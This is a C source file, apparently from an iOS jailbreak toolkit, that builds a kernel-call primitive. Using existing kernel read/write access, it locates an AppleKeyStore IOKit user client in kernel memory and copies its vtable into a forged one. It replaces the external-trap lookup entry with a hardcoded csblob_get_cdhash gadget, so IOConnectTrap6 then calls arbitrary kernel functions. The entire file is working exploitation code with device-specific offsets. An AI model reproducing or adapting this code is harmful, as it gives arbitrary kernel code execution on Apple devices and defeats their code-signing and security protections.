#include "kcall.h"
#include "libkrw.h"

static io_connect_t g_conn = IO_OBJECT_NULL;
static kaddr_t csblob_get_cdhash, orig_vtab, fake_vtab, user_client;

kaddr_t our_task;

//offset
static int task_itk_space_off = 0x330;
static int vtab_get_ext_trap_for_idx_off = 0x5C0;

#define MAX_VTAB_SZ (vm_kernel_page_size)
#define USER_CLIENT_TRAP_OFF (0x48)
#define IPC_SPACE_IS_TABLE_SZ_OFF (0x14)
#define IPC_SPACE_IS_TABLE_OFF (0x20)
#define IPC_ENTRY_SZ (0x18)
#define IPC_ENTRY_IE_OBJECT_OFF (0x0)
#define IPC_PORT_IP_KOBJECT_OFF (0x68)
#ifndef MIN
#    define MIN(a, b) ((a) < (b) ? (a) : (b))
#endif

static kern_return_t
lookup_ipc_port(mach_port_name_t port_name, kaddr_t *ipc_port) {
    ipc_entry_num_t port_idx, is_table_sz;
    kaddr_t itk_space, is_table;

    if(MACH_PORT_VALID(port_name) && kread_addr(our_task + task_itk_space_off, &itk_space) == KERN_SUCCESS) {
        printf("itk_space: " KADDR_FMT "\n", itk_space);
        if(kread_buf_univ(itk_space + IPC_SPACE_IS_TABLE_SZ_OFF, &is_table_sz, sizeof(is_table_sz)) == KERN_SUCCESS) {
            printf("is_table_sz: 0x%" PRIX32 "\n", is_table_sz);
            if((port_idx = MACH_PORT_INDEX(port_name)) < is_table_sz && kread_addr(itk_space + IPC_SPACE_IS_TABLE_OFF, &is_table) == KERN_SUCCESS) {
                printf("is_table: " KADDR_FMT "\n", is_table);
                return kread_addr(is_table + port_idx * IPC_ENTRY_SZ + IPC_ENTRY_IE_OBJECT_OFF, ipc_port);
            }
        }
    }
    return KERN_FAILURE;
}

static kern_return_t
lookup_io_object(io_object_t object, kaddr_t *ip_kobject) {
    kaddr_t ipc_port;

    if(lookup_ipc_port(object, &ipc_port) == KERN_SUCCESS) {
        printf("ipc_port: " KADDR_FMT "\n", ipc_port);
        return kread_addr(ipc_port + IPC_PORT_IP_KOBJECT_OFF, ip_kobject);
    }
    return KERN_FAILURE;
}

static io_connect_t
get_conn(const char *name) {
    io_service_t serv = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(name));
    io_connect_t conn = IO_OBJECT_NULL;

    if(serv != IO_OBJECT_NULL) {
        printf("serv: 0x%" PRIX32 "\n", serv);
        if(IOServiceOpen(serv, mach_task_self(), 0, &conn) != KERN_SUCCESS) {
            conn = IO_OBJECT_NULL;
        }
        IOObjectRelease(serv);
    }
    return conn;
}

void
kcall_term(void) {
    io_external_trap_t trap = { 0 };

    kwrite_addr(user_client, orig_vtab);
    kdealloc(fake_vtab, MAX_VTAB_SZ);
    kwrite_buf_univ(user_client + USER_CLIENT_TRAP_OFF, &trap, sizeof(trap));
    IOServiceClose(g_conn);
}

kern_return_t
kcall_init(void) {
    csblob_get_cdhash = 0xFFFFFFF0075038B0 + kslide;
    if((g_conn = get_conn("AppleKeyStore")) != IO_OBJECT_NULL) {
        printf("g_conn: 0x%" PRIX32 "\n", g_conn);
        if(find_task(getpid(), &our_task) == KERN_SUCCESS) {
            printf("our_task: " KADDR_FMT "\n", our_task);
            if(lookup_io_object(g_conn, &user_client) == KERN_SUCCESS) {
                printf("user_client: " KADDR_FMT "\n", user_client);
                if(kread_addr(user_client, &orig_vtab) == KERN_SUCCESS) {
                    printf("orig_vtab: " KADDR_FMT "\n", orig_vtab);
                    if(kmalloc(&fake_vtab, MAX_VTAB_SZ) == KERN_SUCCESS) {
                        printf("fake_vtab: " KADDR_FMT "\n", fake_vtab);
                        if(mach_vm_copy(tfp0, orig_vtab, MAX_VTAB_SZ, fake_vtab) == KERN_SUCCESS && kwrite_addr(fake_vtab + vtab_get_ext_trap_for_idx_off, csblob_get_cdhash) == KERN_SUCCESS && kwrite_addr(user_client, fake_vtab) == KERN_SUCCESS) {
                            return KERN_SUCCESS;
                        }
                        kdealloc(fake_vtab, MAX_VTAB_SZ);
                    }
                }
            }
        }
        IOServiceClose(g_conn);
    }
    return KERN_FAILURE;
}

kern_return_t
kcall(kern_return_t *ret, kaddr_t func, size_t argc, ...) {
    io_external_trap_t trap;
    kaddr_t args[7] = { 1 };
    va_list ap;
    size_t i;

    va_start(ap, argc);
    for(i = 0; i < MIN(argc, 7); ++i) {
        args[i] = va_arg(ap, kaddr_t);
    }
    va_end(ap);
    trap.obj = args[0];
    trap.func = func;
    trap.delta = 0;
    if(kwrite_buf_univ(user_client + USER_CLIENT_TRAP_OFF, &trap, sizeof(trap)) == KERN_SUCCESS) {
        *ret = IOConnectTrap6(g_conn, 0, args[1], args[2], args[3], args[4], args[5], args[6]);
        return KERN_SUCCESS;
    }
    return KERN_FAILURE;
}
